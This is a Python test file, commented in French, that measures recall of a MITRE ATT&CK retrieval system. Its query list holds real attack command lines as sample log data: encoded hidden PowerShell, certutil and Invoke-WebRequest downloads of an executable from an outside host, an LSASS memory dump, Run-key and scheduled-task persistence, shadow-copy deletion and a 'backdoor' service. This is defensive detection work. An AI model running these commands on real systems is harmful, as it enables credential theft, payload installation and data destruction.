"""Recherche ATT&CK : Rappel@5 sur des comportements observés dans les journaux (EF-10)."""

from __future__ import annotations

import pytest

from gateway.tool_schemas import AttackSearchArgs

QUERIES = [
    ("powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ", "T1059.001"),
    ("certutil -urlcache -split -f http://198.51.100.23/update.txt C:\\Users\\Public\\upd.exe", "T1105"),
    ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 664 C:\\Users\\Public\\lsass.dmp full", "T1003.001"),
    ("process rundll32.exe accessed lsass.exe with granted access 0x1fffff", "T1003.001"),
    ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveUpdate", "T1547.001"),
    ("schtasks /create /sc onlogon /tn \"OneDrive Update\" /tr C:\\Users\\Public\\odupdate.exe", "T1053.005"),
    ("whoami /all", "T1033"),
    ("net user", "T1087.001"),
    ("net localgroup administrators", "T1069.001"),
    ("ipconfig /all", "T1016"),
    ("systeminfo", "T1082"),
    ("outbound HTTP connection from powershell to command and control server", "T1071.001"),
    ("Invoke-WebRequest -Uri http://x/odupdate.exe -OutFile C:\\Users\\Public\\odupdate.exe", "T1105"),
    ("cmd.exe /c echo test", "T1059.003"),
    ("vssadmin delete shadows /all /quiet", "T1490"),
    ("wmic process call create calc.exe", "T1047"),
    ("sc create backdoor binPath= C:\\temp\\svc.exe", "T1543.003"),
    ("tasklist /v", "T1057"),
]


def test_recall_at_5(rag):
    hits = [expected in [r["technique_id"] for r in rag.search(q, k=5)] for q, expected in QUERIES]
    recall = sum(hits) / len(hits)
    misses = [q for (q, _), h in zip(QUERIES, hits) if not h]
    assert recall >= 0.85, f"Rappel@5 = {recall:.2f}, échecs : {misses}"


def test_explicit_technique_id_first(rag):
    assert rag.search("comportement lié à T1021.002", k=3)[0]["technique_id"] == "T1021.002"


def test_tactic_filter(rag):
    results = rag.search("powershell", k=5, tactic="execution")
    assert results and all("execution" in r["tactics"] for r in results)
    legacy = rag.search("obfuscation", k=5, tactic="defense-evasion")
    assert legacy and all({"stealth", "defense-impairment"} & set(r["tactics"]) for r in legacy)


def test_fragments_are_citable(rag):
    for r in rag.search("lsass memory dump", k=5):
        frag = rag.fragment(r["fragment_id"])
        assert frag is not None and frag.technique_id == r["technique_id"]
        assert r["fragment_id"].startswith(r["technique_id"] + "#")


def test_attack_search_tool_format(rag):
    payload = rag.attack_search(AttackSearchArgs(query="scheduled task persistence", k=3))
    assert len(payload["items"]) == 3
    for item in payload["items"]:
        assert item["source"] == "mitre-attack" and item["summary"] and item["fragment_id"]


@pytest.mark.parametrize("tid", ["T1059.001", "T1105", "T1003.001", "T1547.001"])
def test_kb_contains_scenario_techniques(rag, tid):
    t = rag.get_technique(tid)
    assert t and t["description"] and t["url"].startswith("https://attack.mitre.org/")


def test_chroma_vector_store(tmp_path):
    """Stockage ChromaDB optionnel (VECTOR_STORE=chroma), ignoré si chromadb n'est pas installé."""
    pytest.importorskip("chromadb")
    from rag.attack_loader import load_kb
    from rag.retriever import AttackRAG

    kb = load_kb()
    small = dict(kb, techniques=[t for t in kb["techniques"] if t["id"].startswith(("T1003", "T1053", "T1105"))])
    rag = AttackRAG(small, vector_store="chroma", data_dir=tmp_path)
    assert rag.search("rundll32 comsvcs.dll MiniDump lsass", k=3)[0]["technique_id"] == "T1003.001"
